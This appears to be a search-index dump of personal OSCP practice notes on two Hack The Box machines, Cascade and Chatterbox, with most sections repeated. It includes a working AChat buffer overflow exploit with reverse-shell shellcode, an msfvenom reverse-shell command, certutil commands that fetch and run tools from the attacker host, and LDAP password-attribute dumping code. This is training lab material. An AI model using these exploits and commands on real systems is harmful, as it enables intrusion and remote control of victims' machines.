msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49170/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal) This one appears to be one of the AD boxes (Kerberos is running on port 88). Enumerate Attack Surface \u00b6 From reviewing the port scan, we see the following structure start to emerge: This box definitely is AD related. - 88: Kerberos - Maybe Kerberoast? - Maybe MS14-068? - 389: LDAP - Might be able to dump everything , or even write data with Manual Enumeration - LDAP can be used without SSL - should sniff this - 636: tcpwrapped (typically LDAPs) - 3268: LDAP (Global Catalog for LDAP) - 3269: tcpwrapped (Global catalog for LDAPs) dnsHostName: CASC-DC1.cascade.local ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local Service Info: - Host: CASC-DC1 - OS: Windows 2008 R2 Definitely a domain controller, also DNS running: - 53: Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1) - Manual digging Also it appears to have a fileshare: - 139: Netbios-ssn - Anonymous Login - 445: Microsoft-ds - RPC running on multiple ports And finally, a few HTTP servers: - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? check _manual_commands.txt - 49157: ncacn_http - RPC over HTTP 1.0 Public Exploits \u00b6 Maybe one of the Eternal exploits would work for Initial foothold? Would need to verify anon login for SMB first. Searchsploit agrees (based on Windows version reported by DNS) Weaponization \u00b6 Exploit planning \u00b6 Check SMB anon login Nope Check MS17-010 EDB-42031 Nope Try LDAP manual enumeration (above) Got some users, but nothing major. WinRM ! Better dive into this. PrivEsc Planning \u00b6 Kerberoast Check MS16-032 Exploit \u00b6 Eternal Blue \u00b6 Couldn't get EDB-42031 working - it's python 2 and my version of Kali is missing impacket for 2. Tried porting to 3, but I would have to go through and call out the byte strings. THIS NEEDS TO BE ADDRESSED BEFORE THE EXAM! I should probably use an older version of Kali which still has support for python2. So, I'll be using my ONE metsaploit for this one......SHIT FML Playing with LDAP \u00b6 I was able to dump everything from LDAP with this: >>> import ldap3 >>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True) >>> connection = ldap3.Connection(server) >>> connection.bind() True >>> server.info >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword') True >>> connection.entries I should also check if I can write data . WinRM \u00b6 Will follow this WinRM Hacking Guide","title":"10.10.10.182"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#101010182","text":"","title":"10.10.10.182"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#port-scan","text":"PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 14:15:04Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49170/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%) No exact OS matches for host (test conditions non-ideal) This one appears to be one of the AD boxes (Kerberos is running on port 88).","title":"Port scan"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#enumerate-attack-surface","text":"From reviewing the port scan, we see the following structure start to emerge: This box definitely is AD related. - 88: Kerberos - Maybe Kerberoast? - Maybe MS14-068? - 389: LDAP - Might be able to dump everything , or even write data with Manual Enumeration - LDAP can be used without SSL - should sniff this - 636: tcpwrapped (typically LDAPs) - 3268: LDAP (Global Catalog for LDAP) - 3269: tcpwrapped (Global catalog for LDAPs) dnsHostName: CASC-DC1.cascade.local ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL serverName: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cascade,DC=local Service Info: - Host: CASC-DC1 - OS: Windows 2008 R2 Definitely a domain controller, also DNS running: - 53: Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1) - Manual digging Also it appears to have a fileshare: - 139: Netbios-ssn - Anonymous Login - 445: Microsoft-ds - RPC running on multiple ports And finally, a few HTTP servers: - 5985: Microsoft HTTPAPI httpd 2.0 - WinRM? check _manual_commands.txt - 49157: ncacn_http - RPC over HTTP 1.0","title":"Enumerate Attack Surface"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#public-exploits","text":"Maybe one of the Eternal exploits would work for Initial foothold? Would need to verify anon login for SMB first. Searchsploit agrees (based on Windows version reported by DNS)","title":"Public Exploits"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#weaponization","text":"","title":"Weaponization"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#exploit-planning","text":"Check SMB anon login Nope Check MS17-010 EDB-42031 Nope Try LDAP manual enumeration (above) Got some users, but nothing major. WinRM ! Better dive into this.","title":"Exploit planning"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#privesc-planning","text":"Kerberoast Check MS16-032","title":"PrivEsc Planning"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#exploit","text":"","title":"Exploit"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#eternal-blue","text":"Couldn't get EDB-42031 working - it's python 2 and my version of Kali is missing impacket for 2. Tried porting to 3, but I would have to go through and call out the byte strings. THIS NEEDS TO BE ADDRESSED BEFORE THE EXAM! I should probably use an older version of Kali which still has support for python2. So, I'll be using my ONE metsaploit for this one......SHIT FML","title":"Eternal Blue"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#playing-with-ldap","text":"I was able to dump everything from LDAP with this: >>> import ldap3 >>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True) >>> connection = ldap3.Connection(server) >>> connection.bind() True >>> server.info >> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword') True >>> connection.entries I should also check if I can write data .","title":"Playing with LDAP"},{"location":"OSCP%20practice%20exam/1.%20Cascade/#winrm","text":"Will follow this WinRM Hacking Guide","title":"WinRM"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/","text":"10.10.10.74 \u00b6 Recon \u00b6 Port Scan \u00b6 PORT STATE SERVICE REASON VERSION 9255/tcp open http syn-ack ttl 127 AChat chat system httpd |_http-title: Site doesn't have a title. | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE 9256/tcp open achat syn-ack ttl 127 AChat chat system Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP2 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows 8.1 Update 1 (89%) Only 2 open ports. I guess the name Chatterbox is supposed to be a joke. Nothing really useful in the scan results. UDP ports are still being scanned, hopefully something comes up. Nothing came up. What on earth am I supposed to do with this box!?!? I feel like I'll need to rescan this one....or something. I reverted and re-scanned. Turns out the name Chatterbox is because this box is hosting AChat. Public exploits \u00b6 Using EDB-36025 . Had to change line 57 to include the right IP address. Also need to swap out the payload - this POC just pops calc.exe Get new payload msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=444 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f python After changing out the payload, here's the completed exploit #!/usr/bin/python # Author KAhara MAnhara # Achat 0.150 beta7 - Buffer Overflow # Tested on Windows 7 32bit import socket import sys, time buf = b\"\" buf += b\"\\x50\\x50\\x59\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\" buf += b\"\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\\x49\\x41\" buf += b\"\\x49\\x41\\x49\\x41\\x49\\x41\\x6a\\x58\\x41\\x51\\x41\\x44\\x41\" buf += b\"\\x5a\\x41\\x42\\x41\\x52\\x41\\x4c\\x41\\x59\\x41\\x49\\x41\\x51\" buf += b\"\\x41\\x49\\x41\\x51\\x41\\x49\\x41\\x68\\x41\\x41\\x41\\x5a\\x31\" buf += b\"\\x41\\x49\\x41\\x49\\x41\\x4a\\x31\\x31\\x41\\x49\\x41\\x49\\x41\" buf += b\"\\x42\\x41\\x42\\x41\\x42\\x51\\x49\\x31\\x41\\x49\\x51\\x49\\x41\" buf += b\"\\x49\\x51\\x49\\x31\\x31\\x31\\x41\\x49\\x41\\x4a\\x51\\x59\\x41\" buf += b\"\\x5a\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x41\\x42\\x6b\\x4d\\x41\" buf += b\"\\x47\\x42\\x39\\x75\\x34\\x4a\\x42\\x4b\\x4c\\x77\\x78\\x44\\x42\" buf += b\"\\x79\\x70\\x79\\x70\\x59\\x70\\x63\\x30\\x74\\x49\\x48\\x65\\x50\" buf += b\"\\x31\\x39\\x30\\x50\\x64\\x34\\x4b\\x6e\\x70\\x6c\\x70\\x32\\x6b\" buf += b\"\\x42\\x32\\x4c\\x4c\\x42\\x6b\\x70\\x52\\x4d\\x44\\x52\\x6b\\x53\" buf += b\"\\x42\\x6c\\x68\\x4a\\x6f\\x48\\x37\\x4e\\x6a\\x6b\\x76\\x4d\\x61\" buf += b\"\\x4b\\x4f\\x34\\x6c\\x6d\\x6c\\x73\\x31\\x61\\x6c\\x6a\\x62\\x6e\" buf += b\"\\x4c\\x6b\\x70\\x57\\x51\\x36\\x6f\\x6c\\x4d\\x79\\x71\\x67\\x57\" buf += b\"\\x38\\x62\\x4b\\x42\\x72\\x32\\x61\\x47\\x74\\x4b\\x61\\x42\\x6a\" buf += b\"\\x70\\x74\\x4b\\x50\\x4a\\x4d\\x6c\\x52\\x6b\\x6e\\x6c\\x6e\\x31\" buf += b\"\\x70\\x78\\x4b\\x33\\x4d\\x78\\x49\\x71\\x78\\x51\\x6f\\x61\\x62\" buf += b\"\\x6b\\x52\\x39\\x6b\\x70\\x6b\\x51\\x37\\x63\\x32\\x6b\\x6f\\x59\" buf += b\"\\x4b\\x68\\x69\\x53\\x4d\\x6a\\x6e\\x69\\x72\\x6b\\x30\\x34\\x52\" buf += b\"\\x6b\\x6a\\x61\\x69\\x46\\x4c\\x71\\x59\\x6f\\x74\\x6c\\x67\\x51\" buf += b\"\\x38\\x4f\\x4c\\x4d\\x7a\\x61\\x77\\x57\\x4d\\x68\\x57\\x70\\x34\" buf += b\"\\x35\\x79\\x66\\x59\\x73\\x31\\x6d\\x78\\x78\\x4f\\x4b\\x31\\x6d\" buf += b\"\\x6f\\x34\\x52\\x55\\x79\\x54\\x42\\x38\\x32\\x6b\\x30\\x58\\x6c\" buf += b\"\\x64\\x6a\\x61\\x67\\x63\\x42\\x46\\x54\\x4b\\x4a\\x6c\\x4e\\x6b\" buf += b\"\\x64\\x4b\\x72\\x38\\x6d\\x4c\\x7a\\x61\\x46\\x73\\x64\\x4b\\x59\" buf += b\"\\x74\\x72\\x6b\\x6d\\x31\\x38\\x50\\x55\\x39\\x51\\x34\\x6c\\x64\" buf += b\"\\x4d\\x54\\x6f\\x6b\\x6f\\x6b\\x51\\x51\\x52\\x39\\x6e\\x7a\\x72\" buf += b\"\\x31\\x79\\x6f\\x47\\x70\\x61\\x4f\\x31\\x4f\\x61\\x4a\\x74\\x4b\" buf += b\"\\x7a\\x72\\x7a\\x4b\\x44\\x4d\\x51\\x4d\\x53\\x38\\x6d\\x63\\x50\" buf += b\"\\x32\\x59\\x70\\x59\\x70\\x52\\x48\\x63\\x47\\x31\\x63\\x30\\x32\" buf += b\"\\x61\\x4f\\x52\\x34\\x30\\x68\\x6e\\x6c\\x71\\x67\\x6c\\x66\\x4d\" buf += b\"\\x37\\x39\\x6f\\x36\\x75\\x55\\x68\\x74\\x50\\x59\\x71\\x59\\x70\" buf += b\"\\x39\\x70\\x6e\\x49\\x49\\x34\\x62\\x34\\x4e\\x70\\x62\\x48\\x4d\" buf += b\"\\x59\\x31\\x70\\x32\\x4b\\x6b\\x50\\x79\\x6f\\x56\\x75\\x32\\x30\" buf += b\"\\x30\\x50\\x52\\x30\\x32\\x30\\x4f\\x50\\x52\\x30\\x4f\\x50\\x50\" buf += b\"\\x50\\x31\\x58\\x69\\x5a\\x6c\\x4f\\x39\\x4f\\x4b\\x30\\x6b\\x4f\" buf += b\"\\x6a\\x35\\x33\\x67\\x50\\x6a\\x6b\\x55\\x71\\x58\\x6a\\x6a\\x79\" buf += b\"\\x7a\\x6e\\x30\\x4d\\x34\\x32\\x48\\x4c\\x42\\x4d\\x30\\x4d\\x31\" buf += b\"\\x45\\x6c\\x34\\x49\\x58\\x66\\x62\\x4a\\x4a\\x70\\x6e\\x76\\x6f\" buf += b\"\\x67\\x43\\x38\\x63\\x69\\x73\\x75\\x44\\x34\\x70\\x61\\x49\\x6f\" buf += b\"\\x56\\x75\\x51\\x75\\x35\\x70\\x70\\x74\\x7a\\x6c\\x79\\x6f\\x4e\" buf += b\"\\x6e\\x69\\x78\\x70\\x75\\x7a\\x4c\\x30\\x68\\x7a\\x50\\x48\\x35\" buf += b\"\\x75\\x52\\x6e\\x76\\x6b\\x4f\\x77\\x65\\x52\\x48\\x71\\x53\\x50\" buf += b\"\\x6d\\x30\\x64\\x59\\x70\\x51\\x79\\x59\\x53\\x42\\x37\\x4e\\x77\" buf += b\"\\x62\\x37\\x70\\x31\\x4a\\x56\\x32\\x4a\\x4d\\x42\\x32\\x39\\x31\" buf += b\"\\x46\\x38\\x62\\x39\\x6d\\x71\\x56\\x75\\x77\\x51\\x34\\x4d\\x54\" buf += b\"\\x6d\\x6c\\x39\\x71\\x59\\x71\\x54\\x4d\\x71\\x34\\x6c\\x64\\x4c\" buf += b\"\\x50\\x59\\x36\\x49\\x70\\x51\\x34\\x62\\x34\\x72\\x30\\x70\\x56\" buf += b\"\\x6f\\x66\\x32\\x36\\x31\\x36\\x42\\x36\\x50\\x4e\\x50\\x56\\x4f\" buf += b\"\\x66\\x42\\x33\\x72\\x36\\x52\\x48\\x50\\x79\\x46\\x6c\\x4d\\x6f\" buf += b\"\\x52\\x66\\x79\\x6f\\x49\\x45\\x73\\x59\\x67\\x70\\x4e\\x6e\\x62\" buf += b\"\\x36\\x4f\\x56\\x79\\x6f\\x4c\\x70\\x62\\x48\\x4b\\x58\\x62\\x67\" buf += b\"\\x4d\\x4d\\x63\\x30\\x69\\x6f\\x37\\x65\\x75\\x6b\\x68\\x70\\x56\" buf += b\"\\x55\\x33\\x72\\x62\\x36\\x51\\x58\\x63\\x76\\x33\\x65\\x37\\x4d\" buf += b\"\\x45\\x4d\\x59\\x6f\\x58\\x55\\x4d\\x6c\\x4a\\x66\\x43\\x4c\\x5a\" buf += b\"\\x6a\\x73\\x50\\x6b\\x4b\\x37\\x70\\x33\\x45\\x59\\x75\\x35\\x6b\" buf += b\"\\x71\\x37\\x4e\\x33\\x30\\x72\\x62\\x4f\\x6f\\x7a\\x6b\\x50\\x6e\" buf += b\"\\x73\\x39\\x6f\\x36\\x75\\x41\\x41\" # Create a UDP socket sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) server_address = ('10.10.10.74', 9256) fs = \"\\x55\\x2A\\x55\\x6E\\x58\\x6E\\x05\\x14\\x11\\x6E\\x2D\\x13\\x11\\x6E\\x50\\x6E\\x58\\x43\\x59\\x39\" p = \"A0000000002#Main\" + \"\\x00\" + \"Z\"*114688 + \"\\x00\" + \"A\"*10 + \"\\x00\" p += \"A0000000002#Main\" + \"\\x00\" + \"A\"*57288 + \"AAAAASI\"*50 + \"A\"*(3750-46) p += \"\\x62\" + \"A\"*45 p += \"\\x61\\x40\" p += \"\\x2A\\x46\" p += \"\\x43\\x55\\x6E\\x58\\x6E\\x2A\\x2A\\x05\\x14\\x11\\x43\\x2d\\x13\\x11\\x43\\x50\\x43\\x5D\" + \"C\"*9 + \"\\x60\\x43\" p += \"\\x61\\x43\" + \"\\x2A\\x46\" p += \"\\x2A\" + fs + \"C\" * (157-len(fs)- 31-3) p += buf + \"A\" * (1152 - len(buf)) p += \"\\x00\" + \"A\"*10 + \"\\x00\" print \"---->{P00F}!\" i=0 while i<len(p): if i > 172000: time.sleep(1.0) sent = sock.sendto(p[i:(i+8192)], server_address) i += sent sock.close() Started a listener, then fired the exploit. My first point :) eeek. User Flag \u00b6 SystemInfo systeminfo Host Name: CHATTERBOX OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00371-222-9819843-86663 Original Install Date: 12/10/2017, 9:18:19 AM System Boot Time: 2/3/2022, 10:37:18 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 2 Processor(s) Installed. [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-05:00) Eastern Time (US & Canada) Total Physical Memory: 2,047 MB Available Physical Memory: 1,536 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 3,425 MB Virtual Memory: In Use: 670 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: \\\\CHATTERBOX Hotfix(s): 183 Hotfix(s) Installed. Hotfix(s): 183 Hotfix(s) Installed. [01]: KB2849697 [02]: KB2849696 [03]: KB2841134 [04]: KB2670838 [05]: KB2830477 [06]: KB2592687 [07]: KB2479943 [08]: KB2491683 [09]: KB2506212 [10]: KB2506928 [11]: KB2509553 [12]: KB2533552 [13]: KB2534111 [14]: KB2545698 [15]: KB2547666 [16]: KB2552343 [17]: KB2560656 [18]: KB2563227 [19]: KB2564958 [20]: KB2574819 [21]: KB2579686 [22]: KB2604115 [23]: KB2620704 [24]: KB2621440 [25]: KB2631813 [26]: KB2639308 [27]: KB2640148 [28]: KB2647753 [29]: KB2654428 [30]: KB2660075 [31]: KB2667402 [32]: KB2676562 [33]: KB2685811 [34]: KB2685813 [35]: KB2690533 [36]: KB2698365 [37]: KB2705219 [38]: KB2719857 [39]: KB2726535 [40]: KB2727528 [41]: KB2729094 [42]: KB2732059 [43]: KB2732487 [44]: KB2736422 [45]: KB2742599 [46]: KB2750841 [47]: KB2761217 [48]: KB2763523 [49]: KB2770660 [50]: KB2773072 [51]: KB2786081 [52]: KB2799926 [53]: KB2800095 [54]: KB2807986 [55]: KB2808679 [56]: KB2813430 [57]: KB2820331 [58]: KB2834140 [59]: KB2840631 [60]: KB2843630 [61]: KB2847927 [62]: KB2852386 [63]: KB2853952 [64]: KB2857650 [65]: KB2861698 [66]: KB2862152 [67]: KB2862330 [68]: KB2862335 [69]: KB2864202 [70]: KB2868038 [71]: KB2871997 [72]: KB2884256 [73]: KB2891804 [74]: KB2892074 [75]: KB2893294 [76]: KB2893519 [77]: KB2894844 [78]: KB2900986 [79]: KB2908783 [80]: KB2911501 [81]: KB2912390 [82]: KB2918077 [83]: KB2919469 [84]: KB2923545 [85]: KB2931356 [86]: KB2937610 [87]: KB2943357 [88]: KB2952664 [89]: KB2966583 [90]: KB2968294 [91]: KB2970228 [92]: KB2972100 [93]: KB2973112 [94]: KB2973201 [95]: KB2973351 [96]: KB2977292 [97]: KB2978742 [98]: KB2984972 [99]: KB2985461 [100]: KB2991963 [101]: KB2992611 [102]: KB3003743 [103]: KB3004361 [104]: KB3004375 [105]: KB3006121 [106]: KB3006137 [107]: KB3010788 [108]: KB3011780 [109]: KB3013531 [110]: KB3020370 [111]: KB3020388 [112]: KB3021674 [113]: KB3021917 [114]: KB3022777 [115]: KB3023215 [116]: KB3030377 [117]: KB3035126 [118]: KB3037574 [119]: KB3042058 [120]: KB3045685 [121]: KB3046017 [122]: KB3046269 [123]: KB3054476 [124]: KB3055642 [125]: KB3059317 [126]: KB3060716 [127]: KB3061518 [128]: KB3067903 [129]: KB3068708 [130]: KB3071756 [131]: KB3072305 [132]: KB3074543 [133]: KB3075226 [134]: KB3078601 [135]: KB3078667 [136]: KB3080149 [137]: KB3084135 [138]: KB3086255 [139]: KB3092627 [140]: KB3093513 [141]: KB3097989 [142]: KB3101722 [143]: KB3102429 [144]: KB3107998 [145]: KB3108371 [146]: KB3108381 [147]: KB3108664 [148]: KB3109103 [149]: KB3109560 [150]: KB3110329 [151]: KB3118401 [152]: KB3122648 [153]: KB3123479 [154]: KB3126587 [155]: KB3127220 [156]: KB3133977 [157]: KB3137061 [158]: KB3138378 [159]: KB3138612 [160]: KB3138910 [161]: KB3139398 [162]: KB3139914 [163]: KB3140245 [164]: KB3147071 [165]: KB3150220 [166]: KB3150513 [167]: KB3156016 [168]: KB3156019 [169]: KB3159398 [170]: KB3161102 [171]: KB3161949 [172]: KB3161958 [173]: KB3172605 [174]: KB3177467 [175]: KB3179573 [176]: KB3184143 [177]: KB3185319 [178]: KB4014596 [179]: KB4019990 [180]: KB4040980 [181]: KB976902 [182]: KB982018 [183]: KB4054518 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.74 copy WinPEAS to target. certutil.exe -urlcache -f http://10.10.16.4:80/winPEASx86.exe wp.exe WinPEAS findings: \u00b6 Nothing else really cool in WinPEAS - guess I should try exploit suggester. Here are the local , non-metasploit , exploits. [E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important [*] https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC [*] https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC [*] [E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important [*] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC PrivEsc \u00b6 MS16-075 - Rotten Potato \u00b6 certutil.exe -urlcache -f http://10.10.16.4:80/potato.exe potato.exe Sleeping for 5 mins....I guess I'll wait for my SYSTEM shell... Shell never came back :( coming back to this later.","title":"10.10.10.74"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#10101074","text":"","title":"10.10.10.74"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#recon","text":"","title":"Recon"},{"location":"OSCP%20practice%20exam/2.%20Chatterbox/#port-scan","text":"PORT STATE SERVICE REASON VERSION 9255/tcp open http syn-ack ttl 127 AChat chat system httpd |_http-title: Site doesn't have a title. | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE 9256/tcp open achat syn-ack ttl 127 AChat chat system Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 